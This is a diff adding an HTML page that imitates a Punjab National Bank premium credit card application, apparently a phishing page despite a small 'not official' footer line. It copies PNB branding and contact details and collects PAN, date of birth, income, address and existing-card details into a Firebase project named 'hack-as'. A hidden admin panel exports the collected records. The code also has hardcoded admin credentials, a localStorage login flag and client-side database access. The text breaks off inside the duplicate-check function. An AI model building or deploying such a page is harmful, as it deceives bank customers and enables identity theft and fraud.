@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PNB Luxura - Premium Metal Credit Card</title>
+
+<!-- Libraries for PDF + Excel -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+  body { background: #f4f6f8; min-height: 100vh; color: #333; }
+
+  /* TOP UTILITY BAR */
+  .topbar-utility {
+    background: #2a050a; color: #ffe6c7; font-size: 12px;
+    padding: 6px 30px; display: flex; justify-content: space-between;
+    align-items: center; flex-wrap: wrap; gap: 8px;
+  }
+  .topbar-utility a { color: #ffe6c7; text-decoration: none; margin-left: 15px; cursor: pointer; }
+  .topbar-utility a:hover { color: #ffb84d; }
+  .topbar-utility .left { display: flex; gap: 15px; }
+
+  /* HEADER */
+  header {
+    background: linear-gradient(90deg, #4a0d16, #7a1e26);
+    color: white; padding: 14px 30px;
+    display: flex; justify-content: space-between; align-items: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.25);
+    position: sticky; top: 0; z-index: 100; flex-wrap: wrap; gap: 12px;
+  }
+
+  /* LOGO = ADMIN LOGIN BUTTON */
+  .logo {
+    display: flex; align-items: center; gap: 14px;
+    cursor: pointer; padding: 6px 10px; border-radius: 8px;
+    transition: 0.2s;
+  }
+  .logo:hover {
+    background: rgba(255,255,255,0.12);
+    transform: scale(1.02);
+  }
+  .logo-circle {
+    width: 48px; height: 48px;
+    background: radial-gradient(circle at 30% 30%, #ffcc66, #d4a017);
+    border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    font-weight: bold; color: #5a1119; font-size: 16px;
+    border: 2px solid #ffd966; box-shadow: 0 0 8px rgba(255,204,102,0.4);
+    transition: 0.2s;
+  }
+  .logo:hover .logo-circle {
+    box-shadow: 0 0 16px rgba(255,217,102,0.9);
+    transform: scale(1.1);
+  }
+  .logo h1 { font-size: 20px; letter-spacing: 0.5px; }
+  .logo small { display: block; font-size: 10.5px; font-weight: normal; color: #ffd966; letter-spacing: 1px; }
+
+  nav { display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
+  nav a {
+    color: white; text-decoration: none; font-size: 13.5px;
+    padding: 8px 14px; border-radius: 5px; cursor: pointer; transition: 0.2s;
+  }
+  nav a:hover { background: rgba(255,255,255,0.12); color: #ffd966; }
+
+  #userView { display: block; }
+  #adminLoginView { display: none; }
+  #adminDashboard { display: none; }
+
+  /* HERO */
+  .hero {
+    background: linear-gradient(120deg, #2a050a, #7a1e26, #2a050a);
+    color: white; padding: 60px 30px; text-align: center;
+    position: relative; overflow: hidden;
+  }
+  .hero::before {
+    content: ""; position: absolute; top: -50px; right: -50px;
+    width: 250px; height: 250px; border-radius: 50%;
+    background: rgba(255,204,102,0.1);
+  }
+  .hero h2 { font-size: 38px; margin-bottom: 14px; font-weight: 700; color: #ffd966; letter-spacing: 1px; }
+  .hero h3 { font-size: 24px; margin-bottom: 10px; font-weight: 500; }
+  .hero p { font-size: 16px; opacity: 0.92; max-width: 780px; margin: 0 auto 22px; line-height: 1.6; }
+  .hero button {
+    background: linear-gradient(90deg, #ffb84d, #ffcc66);
+    color: #5a1119; border: none; padding: 14px 36px;
+    font-size: 16px; font-weight: bold; border-radius: 30px;
+    cursor: pointer; transition: 0.3s; text-transform: uppercase;
+    box-shadow: 0 4px 15px rgba(255,184,77,0.4);
+  }
+  .hero button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,184,77,0.6); }
+
+  /* IMPORTANT MESSAGE */
+  .important-msg {
+    background: #fff5e6; border-left: 5px solid #d4a017;
+    max-width: 1100px; margin: 30px auto; padding: 20px 25px;
+    border-radius: 8px; box-shadow: 0 3px 10px rgba(0,0,0,0.06);
+  }
+  .important-msg h3 {
+    color: #7a1e26; font-size: 16px; margin-bottom: 10px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .important-msg h3::before { content: "⚠️"; }
+  .important-msg ul { list-style: none; padding-left: 5px; }
+  .important-msg li {
+    padding: 7px 0; font-size: 13.5px; color: #5a3a1a;
+    border-bottom: 1px dashed #f0d9b5; line-height: 1.5;
+  }
+  .important-msg li:last-child { border-bottom: none; }
+  .important-msg li::before { content: "• "; color: #d4a017; font-weight: bold; }
+
+  /* CONTAINER */
+  .container { max-width: 1100px; margin: 0 auto; padding: 0 20px 40px; }
+  .section-title { color: #7a1e26; text-align: center; font-size: 28px; margin: 40px 0 8px; font-weight: 700; }
+  .section-sub { text-align: center; color: #777; font-size: 14px; margin-bottom: 30px; }
+
+  /* LUXURA FEATURES BOX (Inspired from image) */
+  .luxura-features {
+    background: linear-gradient(135deg, #4a0d16, #7a1e26);
+    color: white; border-radius: 16px; padding: 40px;
+    margin-bottom: 40px; box-shadow: 0 10px 30px rgba(122,30,38,0.3);
+    border: 2px solid #d4a017;
+  }
+  .luxura-features h2 {
+    text-align: center; font-size: 26px; margin-bottom: 30px;
+    color: #ffd966; text-transform: uppercase; letter-spacing: 2px;
+  }
+  .features-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 20px;
+  }
+  .feature-item {
+    background: rgba(255,255,255,0.08); border-radius: 10px;
+    padding: 15px 20px; display: flex; align-items: center; gap: 15px;
+    border-left: 4px solid #ffd966; transition: 0.2s;
+  }
+  .feature-item:hover { background: rgba(255,255,255,0.15); transform: translateX(5px); }
+  .feature-item .f-icon { font-size: 28px; }
+  .feature-item .f-text { font-size: 14.5px; font-weight: 500; line-height: 1.4; }
+
+  /* FORM */
+  .form-section {
+    background: white; padding: 40px; border-radius: 14px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08); margin: 40px 0;
+    display: none; border-top: 5px solid #d4a017;
+  }
+  .form-section.active { display: block; }
+  .form-section h2 { color: #7a1e26; margin-bottom: 5px; text-align: center; font-size: 24px; }
+  .form-section .form-sub { text-align: center; color: #888; font-size: 13px; margin-bottom: 28px; }
+  .form-group { margin-bottom: 18px; }
+  .form-group label {
+    display: block; margin-bottom: 6px;
+    color: #5a1119; font-weight: 600; font-size: 13.5px;
+  }
+  .form-group input, .form-group select {
+    width: 100%; padding: 12px; border: 1.5px solid #e0d6c2; border-radius: 8px;
+    font-size: 14.5px; transition: 0.2s; background: #fffdf9;
+  }
+  .form-group input:focus, .form-group select:focus {
+    outline: none; border-color: #d4a017;
+    box-shadow: 0 0 0 3px rgba(212,160,23,0.15); background: white;
+  }
+  .form-group .hint { font-size: 11.5px; color: #999; margin-top: 4px; font-style: italic; }
+  .row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+  .submit-btn {
+    width: 100%; padding: 14px;
+    background: linear-gradient(90deg, #ffb84d, #ffcc66);
+    color: #5a1119; border: none; border-radius: 8px;
+    font-size: 16px; font-weight: bold; cursor: pointer;
+    margin-top: 10px; transition: 0.2s;
+  }
+  .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,184,77,0.4); }
+  .submit-btn:disabled { background: #ccc; cursor: not-allowed; color: #777; }
+
+  .success {
+    display: none; background: #d4edda; color: #155724;
+    padding: 18px; border-radius: 10px; margin-top: 20px;
+    text-align: center; font-weight: bold; border: 1px solid #c3e6cb;
+  }
+  .success.show { display: block; }
+  .error {
+    display: none; background: #f8d7da; color: #721c24;
+    padding: 15px; border-radius: 10px; margin-top: 20px;
+    text-align: center; border: 1px solid #f5c6cb;
+  }
+  .error.show { display: block; }
+
+  /* NO CARD WARNING */
+  .no-card-warning {
+    display: none; background: #f8d7da; border: 2px solid #dc3545;
+    border-radius: 12px; padding: 25px; margin-top: 20px; text-align: center;
+  }
+  .no-card-warning.show { display: block; }
+  .no-card-warning .icon { font-size: 45px; margin-bottom: 10px; }
+  .no-card-warning h3 { color: #721c24; font-size: 20px; margin-bottom: 10px; }
+  .no-card-warning p { color: #5a1a1a; font-size: 14px; margin-bottom: 12px; line-height: 1.6; }
+  .no-card-warning .sub-info {
+    background: white; border-radius: 8px; padding: 15px;
+    margin-top: 15px; text-align: left; font-size: 13px; color: #5a1a1a; line-height: 1.7;
+  }
+  .no-card-warning .sub-info strong { color: #7a1e26; }
+
+  /* DUPLICATE BOX */
+  .duplicate-box {
+    display: none; background: #fff3cd; border: 2px solid #ffb84d;
+    border-radius: 12px; padding: 25px; margin-top: 20px;
+  }
+  .duplicate-box.show { display: block; }
+  .duplicate-box .icon { font-size: 40px; margin-bottom: 10px; text-align: center; }
+  .duplicate-box h3 { color: #7a1e26; font-size: 20px; margin-bottom: 10px; text-align: center; }
+  .duplicate-box p { color: #5a3a1a; font-size: 14px; margin-bottom: 12px; line-height: 1.5; text-align: center; }
+  .duplicate-box .app-info {
+    background: white; border-radius: 8px; padding: 15px;
+    margin-top: 15px; text-align: left; font-size: 13px;
+  }
+  .duplicate-box .app-info div {
+    padding: 6px 0; border-bottom: 1px dashed #f0d9b5;
+    display: flex; justify-content: space-between;
+  }
+  .duplicate-box .app-info div:last-child { border-bottom: none; }
+  .duplicate-box .app-info strong { color: #5a1119; }
+
+  /* CHECK STATUS */
+  .status-box {
+    background: white; padding: 35px; border-radius: 14px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08); margin: 40px auto;
+    display: none; border-top: 5px solid #7a1e26; max-width: 500px;
+  }
+  .status-box.active { display: block; }
+  .status-box h2 { color: #7a1e26; margin-bottom: 8px; text-align: center; font-size: 22px; }
+  .status-box p { text-align: center; color: #888; font-size: 13px; margin-bottom: 22px; }
+  .status-result {
+    display: none; margin-top: 20px; padding: 20px;
+    background: #fbf7ee; border-radius: 10px; border-left: 5px solid #d4a017;
+  }
+  .status-result.show { display: block; }
+  .status-result .row-line {
+    display: flex; justify-content: space-between;
+    padding: 8px 0; border-bottom: 1px dashed #f0d9b5; font-size: 13.5px;
+  }
+  .status-result .row-line:last-child { border-bottom: none; }
+  .status-result .row-line strong { color: #5a1119; }
+
+  /* FOOTER */
+  footer {
+    background: #2a050a; color: #ffe6c7;
+    text-align: center; padding: 30px 20px; font-size: 13px; margin-top: 30px;
+  }
+  footer .footer-links {
+    margin-bottom: 15px; display: flex; justify-content: center;
+    gap: 25px; flex-wrap: wrap;
+  }
+  footer .footer-links a { color: #ffd966; text-decoration: none; font-size: 13px; cursor: pointer; }
+  footer .footer-links a:hover { text-decoration: underline; }
+  footer p { opacity: 0.75; margin: 5px 0; }
+  footer .copyright { font-size: 11.5px; opacity: 0.5; margin-top: 12px; }
+
+  /* ADMIN LOGIN */
+  .login-screen {
+    display: flex; align-items: center; justify-content: center;
+    min-height: calc(100vh - 150px);
+    background: linear-gradient(120deg, #2a050a, #7a1e26);
+    padding: 30px 20px;
+  }
+  .login-box {
+    background: white; padding: 40px; border-radius: 14px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.5); width: 100%; max-width: 400px;
+    border-top: 5px solid #d4a017;
+  }
+  .login-box h1 { color: #7a1e26; text-align: center; margin-bottom: 6px; font-size: 24px; }
+  .login-box p { text-align: center; color: #777; margin-bottom: 25px; font-size: 13.5px; }
+  .login-box input {
+    width: 100%; padding: 12px; margin-bottom: 15px;
+    border: 1.5px solid #e0d6c2; border-radius: 8px; font-size: 14.5px; background: #fffdf9;
+  }
+  .login-box input:focus { outline: none; border-color: #d4a017; background: white; }
+  .login-box button {
+    width: 100%; padding: 13px;
+    background: linear-gradient(90deg, #ffb84d, #ffcc66);
+    color: #5a1119; border: none; border-radius: 8px;
+    font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.2s;
+  }
+  .login-box button:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(255,184,77,0.4); }
+  .login-error { color: #dc3545; text-align: center; margin-top: 12px; font-size: 13.5px; display: none; }
+  .back-link { text-align: center; margin-top: 15px; }
+  .back-link a { color: #7a1e26; font-size: 13px; cursor: pointer; text-decoration: underline; }
+
+  /* ADMIN DASHBOARD */
+  .admin-topbar {
+    background: linear-gradient(90deg, #4a0d16, #7a1e26);
+    color: white; padding: 16px 30px;
+    display: flex; justify-content: space-between; align-items: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.2); flex-wrap: wrap; gap: 10px;
+  }
+  .admin-topbar h1 { font-size: 19px; }
+  .admin-topbar h1 span { color: #ffd966; }
+  .admin-topbar button {
+    background: linear-gradient(90deg, #ffb84d, #ffcc66);
+    color: #5a1119; border: none;
+    padding: 8px 18px; border-radius: 6px; cursor: pointer;
+    font-weight: bold; font-size: 13px;
+  }
+  .admin-topbar button:hover { transform: translateY(-1px); }
+  .admin-btns { display: flex; gap: 8px; flex-wrap: wrap; }
+  .admin-btns .btn-excel { background: linear-gradient(90deg,#28a745,#34ce57); color:white; }
+  .admin-btns .btn-pdf { background: linear-gradient(90deg,#dc3545,#e4606d); color:white; }
+  .admin-btns .btn-refresh { background: linear-gradient(90deg,#7a1e26,#a12a34); color:white; }
+
+  .stats {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 20px; padding: 30px; max-width: 1300px; margin: 0 auto;
+  }
+  .stat-card {
+    background: white; padding: 25px; border-radius: 12px;
+    box-shadow: 0 3px 12px rgba(0,0,0,0.07); border-left: 5px solid #7a1e26;
+  }
+  .stat-card h3 { color: #666; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+  .stat-card .value { font-size: 32px; font-weight: bold; color: #7a1e26; }
+  .stat-card.pending { border-left-color: #ffb84d; }
+  .stat-card.pending .value { color: #d49a1f; }
+  .stat-card.approved { border-left-color: #28a745; }
+  .stat-card.approved .value { color: #28a745; }
+  .stat-card.rejected { border-left-color: #dc3545; }
+  .stat-card.rejected .value { color: #dc3545; }
+
+  .table-container {
+    max-width: 1300px; margin: 0 auto 40px;
+    background: white; border-radius: 12px; padding: 25px 30px;
+    box-shadow: 0 3px 12px rgba(0,0,0,0.07); width: calc(100% - 60px);
+  }
+  .table-header {
+    display: flex; justify-content: space-between;
+    align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px;
+  }
+  .table-header h2 { color: #7a1e26; font-size: 19px; }
+
+  table { width: 100%; border-collapse: collapse; }
+  th, td { padding: 12px 10px; text-align: left; font-size: 13px; border-bottom: 1px solid #f0e6d2; }
+  th { background: #fbf7ee; color: #7a1e26; font-weight: 600; font-size: 11.5px; text-transform: uppercase; letter-spacing: 0.5px; }
+  tr:hover { background: #fdfaf3; }
+
+  .badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; display: inline-block; }
+  .badge.pending { background: #fff3cd; color: #856404; }
+  .badge.approved { background: #d4edda; color: #155724; }
+  .badge.rejected { background: #f8d7da; color: #721c24; }
+
+  .action-btn {
+    padding: 5px 10px; border: none; border-radius: 5px;
+    cursor: pointer; font-size: 11px; margin-right: 4px;
+    font-weight: bold; transition: 0.15s;
+  }
+  .action-btn.approve { background: #28a745; color: white; }
+  .action-btn.reject { background: #dc3545; color: white; }
+  .action-btn.delete { background: #6c757d; color: white; }
+  .action-btn:hover { opacity: 0.85; transform: translateY(-1px); }
+  .empty { text-align: center; color: #999; padding: 40px; }
+
+  @media (max-width: 700px) {
+    .topbar-utility { padding: 8px 15px; font-size: 11px; justify-content: center; }
+    header { padding: 12px 18px; }
+    .logo h1 { font-size: 17px; }
+    .logo-circle { width: 40px; height: 40px; font-size: 13px; }
+    nav a { padding: 6px 10px; font-size: 12.5px; }
+    .hero { padding: 40px 18px; }
+    .hero h2 { font-size: 28px; }
+    .hero p { font-size: 14px; }
+    .row { grid-template-columns: 1fr; }
+    .form-section { padding: 25px 18px; }
+    .table-container { overflow-x: auto; padding: 15px; width: calc(100% - 30px); }
+    table { min-width: 1200px; }
+    .admin-topbar { padding: 12px 18px; flex-direction: column; gap: 10px; text-align: center; }
+  }
+</style>
+</head>
+<body>
+
+<!-- TOP UTILITY BAR -->
+<div class="topbar-utility">
+  <div class="left">
+    <span>📞 Customer Care: 1800-180-2222</span>
+    <span>✉️ creditcards@pnb.co.in</span>
+  </div>
+  <div>
+    <a onclick="showUser()">Home</a>
+    <a onclick="showCheckStatus()">Check Status</a>
+  </div>
+</div>
+
+<!-- MAIN HEADER -->
+<header>
+  <div class="logo" onclick="showAdminLogin()" title="Admin Login">
+    <div class="logo-circle">PNB</div>
+    <div>
+      <h1>Punjab National Bank</h1>
+      <small>LUXURA CREDIT CARD</small>
+    </div>
+  </div>
+  <nav>
+    <a onclick="showUser()">Home</a>
+    <a onclick="scrollToFeatures()">Features</a>
+    <a onclick="scrollToForm()">Apply Now</a>
+    <a onclick="showCheckStatus()">Check Status</a>
+  </nav>
+</header>
+
+<!-- USER VIEW -->
+<div id="userView">
+  <section class="hero">
+    <h2>PNB LUXURA</h2>
+    <h3>Premium Metal Credit Card</h3>
+    <p>Experience the ultimate luxury with exclusive benefits, unlimited lounge access, and unparalleled rewards. Elevate your lifestyle today.</p>
+    <button onclick="scrollToForm()">Apply Now →</button>
+  </section>
+
+  <div class="important-msg">
+    <h3>Important Message</h3>
+    <ul>
+      <li>Prevent fraud! PNB or its employees never ask for your details such as Card number, card expiry, CVV, OTP or password. Do not share these with anyone over call or email.</li>
+      <li><strong>Eligibility:</strong> To apply for the PNB Luxura Credit Card, you must already hold a valid credit card from another bank. First-time users cannot apply.</li>
+      <li><strong>Only one application per user</strong> is allowed (duplicate applications with the same mobile / PAN / email will be rejected).</li>
+      <li>Revised service charges w.e.f. 01st Nov 2026.</li>
+    </ul>
+  </div>
+
+  <div class="container">
+    
+    <!-- LUXURA FEATURES SECTION -->
+    <h2 class="section-title" id="featuresTitle">Exclusive Luxura Benefits</h2>
+    <p class="section-sub">A metal card designed for those who demand the best</p>
+
+    <div class="luxura-features" id="features">
+      <h2>PNB LUXURA</h2>
+      <div class="features-grid">
+        <div class="feature-item">
+          <div class="f-icon">🛋️</div>
+          <div class="f-text">Unlimited Lounge Access</div>
+        </div>
+        <div class="feature-item">
+          <div class="f-icon">🌍</div>
+          <div class="f-text">Zero Forex Markup</div>
+        </div>
+        <div class="feature-item">
+          <div class="f-icon">🏨</div>
+          <div class="f-text">Unlimited 2+1 Stay @ ITC</div>
+        </div>
+        <div class="feature-item">
+          <div class="f-icon">💰</div>
+          <div class="f-text">Milestone benefit: 10,000 reward points on spend of ₹5 Lakhs annually</div>
+        </div>
+        <div class="feature-item">
+          <div class="f-icon">🎬</div>
+          <div class="f-text">Buy 1 Get 1 Movie Ticket on BookMyShow</div>
+        </div>
+        <div class="feature-item">
+          <div class="f-icon">✨</div>
+          <div class="f-text">3X Reward Points on Travel & Dining</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- APPLICATION FORM -->
+    <section class="form-section" id="apply">
+      <h2>Apply for PNB Luxura Card</h2>
+      <p class="form-sub">Fill in your details below. Our team will reach out within 24–48 hours.</p>
+      <form id="applyForm" onsubmit="return submitForm(event)">
+        <div class="row">
+          <div class="form-group">
+            <label>Full Name *</label>
+            <input type="text" id="name" required placeholder="Enter your full name">
+          </div>
+          <div class="form-group">
+            <label>Mobile Number *</label>
+            <input type="tel" id="mobile" required pattern="[0-9]{10}" placeholder="10-digit mobile number">
+          </div>
+        </div>
+        <div class="row">
+          <div class="form-group">
+            <label>Email Address *</label>
+            <input type="email" id="email" required placeholder="you@example.com">
+          </div>
+          <div class="form-group">
+            <label>Date of Birth *</label>
+            <input type="date" id="dob" required>
+          </div>
+        </div>
+        <div class="row">
+          <div class="form-group">
+            <label>PAN Number *</label>
+            <input type="text" id="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" placeholder="ABCDE1234F" style="text-transform:uppercase">
+          </div>
+          <div class="form-group">
+            <label>Monthly Income (₹) *</label>
+            <input type="number" id="income" required min="10000" placeholder="e.g. 50000">
+          </div>
+        </div>
+
+        <!-- EXISTING CREDIT CARD INFO -->
+        <div class="row">
+          <div class="form-group">
+            <label>Existing Credit Card *</label>
+            <select id="existingCard" required onchange="onExistingCardChange()">
+              <option value="">-- Select --</option>
+              <option value="HDFC">HDFC Bank</option>
+              <option value="ICICI">ICICI Bank</option>
+              <option value="SBI">State Bank of India</option>
+              <option value="Axis">Axis Bank</option>
+              <option value="Kotak">Kotak Mahindra</option>
+              <option value="PNB">Punjab National Bank</option>
+              <option value="IDFC">IDFC First</option>
+              <option value="IndusInd">IndusInd Bank</option>
+              <option value="Yes Bank">Yes Bank</option>
+              <option value="Other">Other</option>
+              <option value="No Credit Card">No credit card (First time)</option>
+            </select>
+            <div class="hint">You must have an existing credit card from another bank to apply.</div>
+          </div>
+          <div class="form-group" id="existingCardLast4Group" style="display:none;">
+            <label>Existing Card Last 4 Digits</label>
+            <input type="text" id="existingCardLast4" maxlength="4" pattern="[0-9]{4}" placeholder="e.g. 1234">
+            <div class="hint">Optional: Enter the last 4 digits of your existing card.</div>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="form-group">
+            <label>Employment Type *</label>
+            <select id="employment" required>
+              <option value="">-- Select --</option>
+              <option value="Salaried">Salaried</option>
+              <option value="Self-Employed">Self-Employed</option>
+              <option value="Business">Business Owner</option>
+              <option value="Student">Student</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Residential Address *</label>
+            <input type="text" id="address" required placeholder="House no, street, city, state, PIN">
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">Submit Application</button>
+
+        <!-- NO CREDIT CARD WARNING -->
+        <div class="no-card-warning" id="noCardWarning">
+          <div class="icon">🚫</div>
+          <h3>Application Not Allowed</h3>
+          <p>You selected <strong>"No credit card (First time)"</strong>. You must already hold a valid credit card from another bank to apply for the PNB Luxura Card.</p>
+          <div class="sub-info">
+            <strong>What can you do?</strong><br>
+            • Apply for a credit card with another bank first.<br>
+            • Once you have an existing credit card, you can apply for the PNB Luxura Card.
+          </div>
+        </div>
+
+        <div class="success" id="successMsg">✅ Application submitted successfully!<br><small>Our team will contact you within 24-48 hours.</small></div>
+        <div class="error" id="errorMsg"></div>
+        
+        <div class="duplicate-box" id="duplicateBox">
+          <div class="icon">⚠️</div>
+          <h3>Application Already Exists</h3>
+          <p>An application with this mobile number, PAN, or email already exists. Only one application is allowed per user.</p>
+          <div class="app-info" id="duplicateInfo"></div>
+        </div>
+      </form>
+    </section>
+
+    <!-- CHECK STATUS -->
+    <section class="status-box" id="statusBox">
+      <h2>Check Application Status</h2>
+      <p>Enter your registered mobile number to check the status.</p>
+      <div class="form-group">
+        <label>Mobile Number</label>
+        <input type="tel" id="statusMobile" pattern="[0-9]{10}" placeholder="10-digit mobile number" maxlength="10">
+      </div>
+      <button onclick="checkStatus()" style="width:100%;padding:12px;background:linear-gradient(90deg,#7a1e26,#a12a34);color:white;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:14px;">Check Status</button>
+      <div class="status-result" id="statusResult"></div>
+    </section>
+  </div>
+
+  <footer>
+    <div class="footer-links">
+      <a onclick="alert('Demo page');return false;">Terms & Conditions</a>
+      <a onclick="alert('Demo page');return false;">Privacy Policy</a>
+      <a onclick="alert('Demo page');return false;">Contact Us</a>
+      <a onclick="alert('Demo page');return false;">FAQs</a>
+    </div>
+    <p><strong>Punjab National Bank</strong> - Credit Card Division</p>
+    <p>📞 1800-180-2222 | ✉️ creditcards@pnb.co.in</p>
+    <p class="copyright">© 2025 PNB Demo Project • Not an official PNB website</p>
+  </footer>
+</div>
+
+<!-- ADMIN LOGIN VIEW -->
+<div id="adminLoginView">
+  <div class="login-screen">
+    <div class="login-box">
+      <h1>PNB Admin Panel</h1>
+      <p>Enter your credentials to access the dashboard</p>
+      <input type="text" id="username" placeholder="Username" value="admin">
+      <input type="password" id="password" placeholder="Password">
+      <button onclick="login()">Login</button>
+      <div class="login-error" id="loginError">❌ Invalid username or password</div>
+      <div class="back-link"><a onclick="showUser()">← Back to Home</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN DASHBOARD VIEW -->
+<div id="adminDashboard">
+  <div class="admin-topbar">
+    <h1>🏦 PNB <span>Luxura Card Admin</span></h1>
+    <div class="admin-btns">
+      <button class="btn-refresh" onclick="loadData()">🔄 Refresh</button>
+      <button class="btn-excel" onclick="downloadExcel()">📥 Download Excel</button>
+      <button class="btn-pdf" onclick="downloadPDF()">📥 Download PDF</button>
+      <button onclick="logout()" style="background:linear-gradient(90deg,#dc3545,#e4606d);color:white;">Logout</button>
+    </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card">
+      <h3>Total Applications</h3>
+      <div class="value" id="total">0</div>
+    </div>
+    <div class="stat-card pending">
+      <h3>Pending</h3>
+      <div class="value" id="pending">0</div>
+    </div>
+    <div class="stat-card approved">
+      <h3>Approved</h3>
+      <div class="value" id="approved">0</div>
+    </div>
+    <div class="stat-card rejected">
+      <h3>Rejected</h3>
+      <div class="value" id="rejected">0</div>
+    </div>
+  </div>
+
+  <div class="table-container">
+    <div class="table-header">
+      <h2>All Applications</h2>
+    </div>
+    <table>
+      <thead>
+        <tr>
+          <th>Name</th>
+          <th>Mobile</th>
+          <th>Email</th>
+          <th>Existing Card</th>
+          <th>Income</th>
+          <th>PAN</th>
+          <th>Employment</th>
+          <th>Status</th>
+          <th>Date</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody">
+        <tr><td colspan="10" class="empty">Loading...</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- FIREBASE + LOGIC -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, push, set, onValue, update, remove, serverTimestamp, get } 
+    from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBnaHdiD_z5VN3QsEGg6PyjlXFZTa78_3I",
+    authDomain: "hack-as-8c494.firebaseapp.com",
+    databaseURL: "https://hack-as-8c494-default-rtdb.firebaseio.com",
+    projectId: "hack-as-8c494",
+    storageBucket: "hack-as-8c494.firebasestorage.app",
+    messagingSenderId: "133555235408",
+    appId: "1:133555235408:web:8881a89d2a33260152ff55",
+    measurementId: "G-V9ECWK2CKW"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const ADMIN_USER = 'admin';
+  const ADMIN_PASS = 'pnb@123';
+
+  let unsubscribe = null;
+  let cachedData = {};
+
+  // ==================== VIEW SWITCHING ====================
+  window.showUser = function() {
+    if (unsubscribe) { unsubscribe(); unsubscribe = null; }
+    document.getElementById('userView').style.display = 'block';
+    document.getElementById('adminLoginView').style.display = 'none';
+    document.getElementById('adminDashboard').style.display = 'none';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  window.showAdminLogin = function() {
+    if (localStorage.getItem('pnbAdminLoggedIn') === 'yes') {
+      showAdminDashboard();
+    } else {
+      document.getElementById('userView').style.display = 'none';
+      document.getElementById('adminLoginView').style.display = 'block';
+      document.getElementById('adminDashboard').style.display = 'none';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+  };
+
+  function showAdminDashboard() {
+    document.getElementById('userView').style.display = 'none';
+    document.getElementById('adminLoginView').style.display = 'none';
+    document.getElementById('adminDashboard').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    loadData();
+  }
+
+  // ==================== SCROLL HELPERS ====================
+  window.scrollToFeatures = function() {
+    document.getElementById('featuresTitle').scrollIntoView({ behavior: 'smooth' });
+  };
+
+  window.scrollToForm = function() {
+    document.getElementById('apply').classList.add('active');
+    document.getElementById('apply').scrollIntoView({ behavior: 'smooth' });
+  };
+
+  window.showCheckStatus = function() {
+    document.getElementById('userView').style.display = 'block';
+    document.getElementById('adminLoginView').style.display = 'none';
+    document.getElementById('adminDashboard').style.display = 'none';
+    document.getElementById('statusBox').classList.add('active');
+    setTimeout(() => {
+      document.getElementById('statusBox').scrollIntoView({ behavior: 'smooth' });
+    }, 100);
+  };
+
+  // ==================== EXISTING CARD LOGIC ====================
+  window.onExistingCardChange = function() {
+    const val = document.getElementById('existingCard').value;
+    const last4Group = document.getElementById('existingCardLast4Group');
+    const submitBtn = document.getElementById('submitBtn');
+    const warning = document.getElementById('noCardWarning');
+    const success = document.getElementById('successMsg');
+    const error = document.getElementById('errorMsg');
+    const dupBox = document.getElementById('duplicateBox');
+
+    success.classList.remove('show');
+    error.classList.remove('show');
+    dupBox.classList.remove('show');
+    warning.classList.remove('show');
+
+    if (val === 'No Credit Card') {
+      submitBtn.disabled = true;
+      submitBtn.textContent = '🚫 Cannot Apply (First Time User)';
+      submitBtn.style.background = '#ccc';
+      last4Group.style.display = 'none';
+      warning.classList.add('show');
+      warning.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    } else if (val === '') {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Submit Application';
+      submitBtn.style.background = '';
+      last4Group.style.display = 'none';
+    } else {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Submit Application';
+      submitBtn.style.background = '';
+      last4Group.style.display = 'block';
+    }
+  };
+
+  // ==================== CHECK DUPLICATE ====================
+  async function isDuplicate(mobile, pan, email) {
+    try {
+      const appsRef = ref(db, 'applications');
+      const snapshot = await get(appsRef);
+      if (!snapshot.exists()) return null;
+      const data = snapshot.val();
+      
+      for (const [id, app] of Object.entries(data)) {
